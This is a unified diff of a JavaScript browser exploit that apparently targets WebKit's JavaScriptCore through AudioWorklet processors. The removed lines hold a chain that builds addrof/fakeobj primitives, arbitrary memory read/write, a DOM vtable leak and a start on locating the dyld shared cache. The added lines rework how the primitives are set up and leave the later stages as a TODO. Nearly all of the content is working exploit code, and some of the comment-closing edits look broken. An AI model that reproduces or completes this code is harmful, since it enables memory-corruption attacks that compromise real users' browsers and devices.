@@ -602,251 +602,175 @@ for(var i = 0; i < 0x10000; i++){
 }
 `);
 b.process = (inputs, outputs, parameters)=>{
-    //sa
-    //
-    /*fuck.port.onmessage = function(e) {
-  //print1('Message received from main script');
-  var workerResult = 'Result: ' + (e.data[0] * e.data[1]);
-  //fuck.port.postMessage('Posting message back to main script');
-  alert(workerResult);
-};*/
-    
-    
-        if(stage== "leak") {
-        var expected_ptr = (BigInt(floatAsQword(c[4])) & 0xFFFFFFFFFFF00000n) - 0x100000n;
-        expected_ptr = Number(expected_ptr);
-        c[8] = qwordAsFloat(expected_ptr + 0x4010);
-        c[9] = qwordAsFloat(0x0);
-        stage  = "bypass_etc";
-        fuck.port.postMessage(c);
-        //sleep(4000);
-        }
-        
-        fuck.port.postMessage("starting");
-        fuck.port.postMessage("spraying structures *unstable*");
-        var gcPreventer = [];
-        for (var i = 0; i < 2; i++) {
-            var a = i == 0 ? parameters : victim;
-            gcPreventer.push(a[0]);
-        }
-        jscell_header = gcPreventer[0];
-        
-        var gcPreventer = [];
-        for (var i = 0; i < 2; i++) {
-            
-            gcPreventer.push(a[1]);
-        }
-        fuck.port.postMessage("done spraying 1 of 2");
-        evil_arr_butterfly = floatAsQword(gcPreventer[0]);
-        
-        structure_id = floatAsQword(jscell_header) & 0xFFFFFFFF;
-        if(structure_id == 0 ){
-            fuck.port.postMessage(`retry`);
-            
-            c[8] = qwordAsFloat(0);
-            parameters = null;
-            //sleep(10000000);
-            //stage = "leak";
-            return false;
-        }
-        fuck.port.postMessage("jscell header :"+ floatAsQword(jscell_header).toString(16));
-        
-        //fuck.port.postMessage(`evil_arr_butterfly : ${evil_arr_butterfly.toString(16)}`);
-        //return false;
-        var cellHeader = jscell_header//qwordAsTagged( (0x01082307 * 0x100000000) + structure_id);
-        //change_container(cellHeader, evil_arr);
-        c[8] = qwordAsFloat(evil_arr_butterfly);
-        evil_arr[0] = cellHeader;
-        evil_arr[1] = qwordAsFloat(evil_arr_butterfly-0x8);
+          const kBoxedDoubleOffset = 0x0002000000000000n;
+          function boxDouble(d) {
+            return d + kBoxedDoubleOffset;
+          }
+          function unboxDouble(d) {
+            return d - kBoxedDoubleOffset;
+          }
+          // the structure ID is wrong, but we'll fix it :)
+          let doubleArrayCellHeader = 0x0108230700000000n;
+          let f = new Float64Array(1);
+          let u = new Uint32Array(f.buffer);
+          function float2bigint(v) {
+            f[0] = v;
+            return BigInt(u[0]) | (BigInt(u[1]) << 32n);
+          }
+          function bigint2float(v) {
+            u[0] = Number(v & 0xffffffffn);
+            u[1] = Number(v >> 32n);
+            return f[0];
+          }
 
-        
-    
-    
-        for(var i =0; i < 2; i++){
-            var a = i == 0 ? parameters: pad;
-            a[0] = qwordAsFloat(0x133700001337);
-        }
-        fuck.port.postMessage("evil_arr length :" + (evil_arr.length).toString(16));
-        evil_arr[0] = qwordAsFloat( (0x00010100 * 0x100000000) + structure_id);
-        evil_arr[1] = qwordAsFloat(0);
-        var boxed_offset = 0;
-        for(var i = 0; i < evil_arr.length; i++){
-            if(evil_arr[i] == qwordAsFloat(0x0041414141414140)){
-                //fuck.port.postMessage(`boxed_arr length offset: ${(i).toString(16)}`);
-                boxed_offset = i;
-                break;
+          // store things to prevent GC
+          let keep = [];
+          function gc(n=10000) {
+            let tmp = [];
+            for (var i = 0; i < n; i++) tmp.push(new Uint8Array(10000));
+          }
+
+          // message port to talk to main thread; will be set later
+          let port = null;
+
+          // will be implemented later
+          let fakeobj = null;
+          let addrof = null;
+
+          for (var i = 0; i < 100; i++) keep.push([1.1*i]);
+          let a0 = [0,0,0,0,0,0,0,0,0,0];
+          let a1 = [0,0,0,0,0,0,0,0,0,0];
+          // transition to unboxed double storage
+          a1[3] = 13.37;
+          let b0 = [0,0,0,0,0,0,0,0,0,0];
+          let b1 = [0,0,a1,a1,0,0,0,0,0,0]; // store references to a1 to make b1 a boxed array
+
+          // put zeroes in first two slots so JSCallbackData destruction is safe
+          delete b1[0];
+          delete b1[1];
+
+          function setupPrimitives() {
+            port.postMessage("setting up");
+            if (a1.length != 0x1337) {
+              port.postMessage("Failure on array length");
+              return;
             }
-        }
+
+            const kSentinel = 1333.337;
+            let offset = -1;
+
+            b1[0] = kSentinel;
+            // scan for the sentinel to find the offset from a to b
+            for (var i = 0; i < 0x100; i++) {
+              if (bigint2float(unboxDouble(float2bigint(a1[i]))) == kSentinel) {
+                offset = i;
+                break;
+              }
+            }
+            if (offset == -1) {
+              port.postMessage("Failure finding offset");
+              return;
+            }
+
+            // temporary implementations
+            addrof = (val) => {
+              b1[0] = val;
+              return float2bigint(a1[offset]);
+            }
+            fakeobj = (addr) => {
+              a1[offset] = bigint2float(addr);
+              return b1[0];
+            }
+
+            let obj = {
+              jsCellHeader: bigint2float(unboxDouble(doubleArrayCellHeader)),
+              fakeButterfly: a0
+            };
+
+            let addr = addrof(obj);
+            port.postMessage("obj @ " + addr.toString(16));
+
+            let fakeArr = fakeobj(addr + 0x10n);
+
+            // subtract off the incref
+            doubleArrayCellHeader = float2bigint(fakeArr[0]) - 0x1n;
+            port.postMessage("double array header: " + doubleArrayCellHeader.toString(16));
+
+            // fix broken cell header
+            fakeArr[0] = bigint2float(doubleArrayCellHeader);
+
+            // grab a real butterfly pointer
+            let doubleArrayButterfly = float2bigint(fakeArr[1]);
+
+            // fix other broken cell header
+            obj.fakeButterfly = b0;
+            fakeArr[0] = bigint2float(doubleArrayCellHeader);
+
+            // fix the broken butterflys and setup cleaner addrof / fakeobj
+            obj.jsCellHeader = bigint2float(unboxDouble(doubleArrayCellHeader));
+            obj.fakeButterfly = a1;
+            fakeArr[1] = bigint2float(doubleArrayButterfly);
+            obj.fakeButterfly = b1;
+            fakeArr[1] = bigint2float(doubleArrayButterfly);
+
+            fakeobj = (addr) => {
+              a1[0] = bigint2float(addr);
+              return b1[0];
+            }
+            addrof = (val) => {
+              b1[0] = val;
+              return float2bigint(a1[0]);
+            }
+          }
+
+          function pwn() {
+            try {
+              setupPrimitives();
+
+              // ensure we can survive GC
+              gc();
+
+              // TODO: rest of exploit goes here
+
+              fuck.port.postMessage("done!");
+            } catch(e) { // send exception strings to main thread (for debugging)
+              fuck.port.postMessage("Exception!!");
+              fuck.port.postMessage(e.toString());
+            }
+          }
+
+          registerProcessor("OrigineWorklet", class {
+            constructor() {
+              // setup a message port to the main thread
+              //port = new AudioWorkletProcessor().port;
+              //port.onmessage = pwn;
+              //fuck = this;
+
+              // this part is magic
+              // put 0xfffe000000001337 in the fastMalloc heap to fake the butterfly sizes
+              eval('1 + 0x1336');
+
+              // overwrite a1's butterfly with a fastMalloc pointer
+              return {fill: 1, a: a0};
+            }
+            process (inputs, outputs, parameters) {
         
-        var addrof = (obj)=>{ //aka
-            boxed[0] = obj;
-            return floatAsQword(evil_arr[boxed_offset]);
-        }
-        var fakeObj = (addr)=>{
-            evil_arr[boxed_offset] = qwordAsFloat(addr);
-            return boxed[0];
-        }
-        
-        // Fill an array we are going to spray with arrays with an element & property,
-    // specifically doubles (important! because we can use raw doubles to represent
-    // pointers)
-    var structure_spray = [];
-    for(var i = 0; i < 1000; i++) {
-        var arr = [13.37];
-        arr.a = 1337;
-        arr['p'+i] = 13.37;                 // p+i instead of p in order to force new structure IDs
-        structure_spray.push(arr)
+        return false;
     }
-
-    // Pick a victim, any victim (seriously, any in the middle-ish)
-    var victim = structure_spray[444];
-
-    // Create some new arrays to do memory manipulation on, one 32 bit, the other 64.
-    var convert = new ArrayBuffer(0x10);
-    var u32 = new Uint32Array(convert);
-    var f64 = new Float64Array(convert);
-    fuck.port.postMessage("about to fake double array");
-    // Setup flag values for ArrayWithDouble & ArrayWithContiguous
-    u32[0] = 0x200; 
-    u32[1] = 0x01082007 - 0x10000;
-    var flag_dbl = f64[0];
-    u32[1] = 0x01082009 - 0x10000;
-    var flag_cnt = u32[0];
-
-    // Create a placeholder object. Outer because it will be the "outer" of hax
-    // Use contiguous so we can play with JSValues of objects. Changed to dbl/ptr later
-    var outer = {
-        cell_header: flag_cnt,
-        butterfly: victim,
-    };
-
-    // Create our custom-crafted hax object
-    // hax: cellheader of ArrayWithContiguous, butterfly is victim
-    f64[0] = addrof(outer);
-    u32[0] += 0x10;
-    var hax = fakeobj(f64[0]);
-
-    // Create and point boxed and unboxed to random locations
-    // Their contents aren't important, only their types
-    var unboxed = [13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37];
-    unboxed = 4.2; // Disable/undo CopyOnWrite (forced to make new Array which is ArrayWithDouble)
-    var boxed = [{}];
-
-    // "Point" refers to changing the given array's butterfly
-    // hax[1] = victim[]'s bfly, meaning that we can point victim[] using hax[1]
-    //
-    // First, point victim[] to unboxed[]
-    // Second, save the location of unboxed
-    // Third, point victim[] to boxed[]
-    // Finally, point unboxed[] and boxed[] to the same place (give them same bfly)
-    // 
-    // This allows us to access victim[] and read/write adresses as doubles with unboxed[]
-    // and then access them as objects with boxed[]
-    hax[1] = unboxed;
-    var tmp_bfly_ptr = victim[1];
-    hax[1] = boxed;
-    victim[1] = tmp_bfly_ptr;
-
-    // Change hax[] from an ArrayWithContiguous into an ArrayWithDouble
-    // This is necessary inorder to avoid boxing our values below when using hax[]
-    outer.cell_header = flag_dbl;
-    fuck.port.postMessage("success done 20%");
-    // Arbitrary read
-    read64 = function(ptr) {
-        f64[0] = ptr;
-        u32[0] += 0x10; // Because accessing property does -0x10
-        hax[1] = f64[0];
-        return victim.a;
+          });
+          registerProcessor("OrigineWorklet2", class {
+            constructor() {
+                fuck = this;
+              // overwrite b1's butterfly with a fastMalloc pointer
+              return {fill: 1, b: b0};
+            }
+            process (inputs, outputs, parameters) {
+        
+        return false;
     }
+          });
 
-    // Arbitrary write
-    write64 = function(ptr, val) {
-        f64[0] = ptr;
-        u32[0] += 0x10; // Because accessing property does -0x10
-        hax[1] = f64[0];
-        victim.a = val;
-    }
-    fuck.port.postMessage("[+] limited memory read/write working");
-        
-        
-        
-    
-        gc();
-        fuck.port.postMessage("Garbage Collected");
-        //sleep(100000);
-        
-        
-    
-    debugger;
-    let fail = function fail(x)
-    {
-        fuck.port.postMessage("FAIL: " + x);
-        location.reload();
-        throw null;
-    }
-        var print1 = fuck.port.postMessage();
-     
-        
-    
-        print1("success now about to parse dyld shared cache...");
-        memory.read64 = read64;
-        memory.write64 = write64;
-        memory.u32 = _u32;
-        //gigauncager();
-
-        print1("[*] Creating the HTMLDivElement wrapper...");
-        var d = document.createElement("div");
-        var ad_div = addrof(d);
-        print1("[+] Address of the div is "+ad_div.toString(16));
-        //alert(FPO)
-        var exe_ptr = memory.read64(Add(ad_div, FPO));
-        print1("[+] Executable instance is at "+exe_ptr.toString(16));
-        var v_tlb = memory.read64(exe_ptr);
-        print1("[+] divelement vtable seems to be at "+v_tlb.toString(16));
-        var anchor = memory.read64(v_tlb);
-        //function exponentiate(x, y) { return x ** y; }
-        /*var l1, l2;
-        l1[0] = {}
-        l2[0] = {};
-        var expr = "l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0];";
-        
-        for (let i = -50; i <= 50; i += 0.1)
-            eval(expr)
-            for (let j = 0; j <= 1000; j++)
-                exponentiate(i, j);*/
-        //var anchor1 = memory.read_i64(anchor,0);
-        //print1('anchor:' + anchor)
-        //anchor is webcore
-        //var vtab = 0x1B205A808;
-        //var nslide = Sub(v_tlb, vtab) - 0x10;
-        var hdr = Sub(anchor, anchor.lo() & 0xfff);
-        //cache
-       /*struct dyld_cache_header
-       {
-           char        magic[16];                // e.g. "dyld_v0    i386" 0-0x10
-           uint32_t    mappingOffset;            // file offset to first dyld_cache_mapping_info 10-0x14
-           uint32_t    mappingCount;            // number of dyld_cache_mapping_info entries 14-0x18
-           uint32_t    imagesOffset;            // file offset to first dyld_cache_image_info 18-0x1C
-           uint32_t    imagesCount;            // number of dyld_cache_image_info entries 1c-0x20
-           uint64_t    dyldBaseAddress;        // base address of dyld when cache was built 20-0x24
-           //28?
-           uint64_t    codeSignatureOffset;    // file offset of code signature blob //0x2C
-           uint64_t    codeSignatureSize;        // size of code signature blob (zero means to end of file) //
-           uint64_t    slideInfoOffset;        // file offset of kernel slid info 0x34
-           uint64_t    slideInfoSize;            // size of kernel slid info 0x3C
-           uint64_t    localSymbolsOffset;        // file offset of where local symbols are stored
-           //0x44
-           uint64_t    localSymbolsSize; //0x4C       // size of local symbols information
-           uint8_t        uuid[16]; // 0x54                // unique value for each shared cache file
-           uint64_t    cacheType;         //0x64      // 1 for development, 0 for optimized
-       };*/
-       
-       print1("dyld cache header @" + hdr); //dyld_cache_header
-    
-    //  sleep(2000);
-       return true;
-}
-class OrigineWorklet extends AudioWorkletProcessor {
+/*class OrigineWorklet extends AudioWorkletProcessor {
     constructor(){
         super();
         //var fuck2 = new AudioWorkletProcessor();
@@ -866,7 +790,7 @@ class OrigineWorklet2 extends AudioWorkletProcessor {
         //console.log(c);
         /*this.port.onmessage = (e)=>{
             alert(e);
-        }*/
+        }/
         
         fuck = this;
         //fuck.port.postMessage(c);
@@ -884,7 +808,7 @@ class OrigineWorklet2 extends AudioWorkletProcessor {
         //this.port.postMessage(c);
         return false;
     }
-}
+}*/
 
 registerProcessor('OrigineWorklet', OrigineWorklet);
 registerProcessor('OrigineWorklet2', OrigineWorklet2);
